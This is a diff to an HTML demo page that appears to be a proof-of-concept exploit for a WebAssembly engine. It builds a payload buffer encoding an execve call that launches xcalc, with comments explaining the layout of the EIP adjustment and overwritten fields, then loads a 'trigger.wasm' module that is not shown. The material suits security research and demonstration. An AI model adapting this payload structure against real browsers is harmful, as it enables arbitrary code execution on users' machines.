@@ -4,13 +4,22 @@
     <meta charset="utf-8">
     <title>Demo</title>
     <script type="text/javascript">
+      // allocate a memory buffer to be used by WebAssembly
       var memory = new WebAssembly.Memory({initial:1});
+      // array views into this memory
       var arr = new Uint8Array(memory.buffer);
       var arr2 = new Uint32Array(memory.buffer);
+      // array with payload
+      // syscall to be executed
+      // execve("/usr/bin/xcalc", [NULL], ["DISPLAY=:0", NULL])
+      // array is contructed like this:
+      // 4B signature | 2B amount to add to EIP | 2B length of first string | 4B overwritten | 4B overwritten | 4B NULL | first string (file to run - "/usr/bin/xcalc") | second string (environment variable to pass - "DISPLAY=:0")
       var temp = new Uint8Array([0xde, 0xc0, 0xad, 0xde, 0x6, 0x0, 0x23, 0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00]);
+      // init the memory buffer
       for (var i = 0; i < temp.length; i++) {
         arr[i] = temp[i];
       }
+      // prepare the imports for WebAssembly module
       var importObject = {
       imports: {
           imported_func: function(arg) {
@@ -24,17 +33,19 @@
   <body>
     <script type="text/javascript">
     function decimalToHexString(number)
-{
-    if (number < 0)
     {
-        number = 0xFFFFFFFF + number + 1;
-    }
+        if (number < 0)
+        {
+            number = 0xFFFFFFFF + number + 1;
+        }
 
-    return number.toString(16).toUpperCase();
-}
+        return number.toString(16).toUpperCase();
+    }
     function test()
     {
       // read out the values of the input fields
+      // and insert them into the array
+      // the first 2 4 Byte elements are overwritten from the input fields
       var val = document.getElementById("val").value;
       val = parseInt(val, 16);
       console.log(decimalToHexString(val));
@@ -43,12 +54,15 @@
       shiftnum = parseInt(shiftnum, 16);
       console.log(decimalToHexString(shiftnum));
       arr2[1] = shiftnum;
+      // load the webassembly module
       fetch('trigger.wasm').then(response =>
       response.arrayBuffer()
     ).then(bytes =>
+    // init the module
       WebAssembly.instantiate(bytes, importObject)
     ).then(results => {
-      var res = results.instance.exports.exported_func(6,0xdeadc0de);
+      // call exported function
+      var res = results.instance.exports.exported_func(0,0);
       console.log("0x" + decimalToHexString(res));
       document.getElementById("result").value = "0x" + decimalToHexString(res);
     });
@@ -57,8 +71,8 @@
     <h2>Demo</h2>
     <form action="/" onsubmit="test(); return false">
     <table>
-      <tr><td>Value:</td><td><input type="text" size="10" value="0x8" id="val"></td></tr>
-      <tr><td>Shift Amount:</td><td><input type="text" size="10" value="4" id="shiftnum"></td></tr>
+      <tr><td>Value 1:</td><td><input type="text" size="10" value="0x8" id="val"></td></tr>
+      <tr><td>Value 2:</td><td><input type="text" size="10" value="4" id="shiftnum"></td></tr>
       <tr><td>Result:</td><td><input type="text" size="10", value="", id="result"></td></tr>
     </table>
     <input type="submit" value="Calculate">
